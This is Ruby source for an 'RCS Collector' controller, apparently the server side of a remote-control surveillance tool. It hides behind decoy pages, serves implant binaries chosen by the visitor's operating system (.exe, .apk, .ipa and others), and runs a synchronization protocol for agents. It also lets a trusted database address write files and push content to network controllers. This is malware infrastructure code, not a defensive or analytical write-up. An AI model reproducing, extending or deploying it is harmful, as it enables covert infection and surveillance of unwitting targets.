
require_relative 'protocol'

module RCS
module Collector

class CollectorController < RESTController
  
  def get
    # serve the requested file
    http_get_file(@request[:headers], @request[:uri])
  rescue Exception => e
    return decoy_page
  end
  
  def put
    # only the DB is authorized to send PUT commands
    unless @request[:peer].eql? Config.instance.global['DB_ADDRESS'] then
      trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send PUT [#{req_uri}] commands!!!"
      return decoy_page
    end
    
    #TODO: time request from server
    
    # this is a request to save a file in the public dir
    return http_put_file @request[:uri], @request[:content] unless @request[:uri].start_with?('/RCS-NC_')
    
    content, content_type = NetworkController.push @request[:uri].split('_')[1], @request[:content]
    return ok(content, {content_type: content_type})
  end
    
  def post
    # get the peer ip address if it was forwarded by a proxy
    peer = http_get_forwarded_peer(@request[:headers]) || @request[:peer]
    # the REST protocol for synchronization
    content, content_type, cookie = Protocol.parse peer, @request[:uri], @request[:cookie], @request[:content]
    return ok(content, {content_type: content_type, cookie: cookie})
  end
  
  #
  # HELPERS
  #

  # returns the content of a file in the public directory
  def http_get_file(headers, uri)
    
    # no automatic index
    return decoy_page if uri.eql? '/'
    
    # search the file in the public directory, and avoid exiting from it
    file_path = Dir.pwd + PUBLIC_DIR + uri
    return decoy_page unless file_path.start_with? Dir.pwd + PUBLIC_DIR
    
    # retrieve the Operating System and app specific extension of the requester
    os, ext = http_get_os(headers)

    file_path = File.realdirpath(file_path)
    file_path += ext unless File.exist?(file_path) and File.file?(file_path)
    
    return decoy_page unless File.exist?(file_path) and File.file?(file_path)

    trace :info, "[#{@request[:peer]}][#{os}] serving #{file_path}"
    
    return stream_file File.realdirpath(file_path)
  end
  
  # return the content of the X-Forwarded-For header
  def http_get_forwarded_peer(headers)
    # extract the XFF
    headers.keep_if { |val| val['X-Forwarded-For:']}
    xff = headers.first
    # no header
    return nil if xff.nil?
    # remove the x-forwarded-for: part
    xff.slice!(0..16)
    # split the peers list
    peers = xff.split(',')
    trace :info, "[#{@request[:peer]}] has forwarded the connection for [#{peers.first}]"
    # we just want the first peer that is the original one
    return peers.first
  end

  # save a file in the /public directory
  def http_put_file(uri, content)
    begin
      # split the path in all the subdir and the filename
      dirs = uri.split('/').keep_if {|x| x.length > 0}
      file = dirs.pop
      if dirs.length == 0 then
        File.open(Dir.pwd + PUBLIC_DIR + '/' + file, 'wb') { |f| f.write content }
      else
        # create all the subdirs
        path = Dir.pwd + PUBLIC_DIR
        dirs.each do |d|
          path += '/' + d
          Dir.mkdir(path)
        end
        # and then the file
        File.open(path + '/' + file, 'wb') { |f| f.write content }
      end
    rescue Exception => e
      return server_error(e.message, {content_type: 'text/html'})
    end

    return ok('OK', {content_type: 'text/html'})
  end

  # returns the operating system of the requester
  def http_get_os(headers)
    # extract the user-agent
    headers.keep_if { |val| val['User-Agent:']}
    user_agent = headers.first
    
    trace :debug, "[#{@request[:peer]}] #{user_agent}"
    
    # return the correct type and extension
    return 'macos', '.app' if user_agent['MacOS;'] or user_agent['Macintosh;']
    return 'iphone', '.ipa' if user_agent['iPhone;'] or user_agent['iPad;'] or user_agent['iPod;']
    return 'windows', '.exe' if user_agent['Windows;']
    return 'winmo', '.cab' if user_agent['Windows CE;']
    return 'blackberry', '.jad' if user_agent['BlackBerry;']
    return 'linux', '.bin' if user_agent['Linux;'] or user_agent['X11;']
    return 'symbian', '.sisx' if user_agent['Symbian;']
    return 'android', '.apk' if user_agent['Android;']

    return 'unknown', ''
  end

end # RCS::Controller::CollectorController

end # RCS::Controller
end # RCS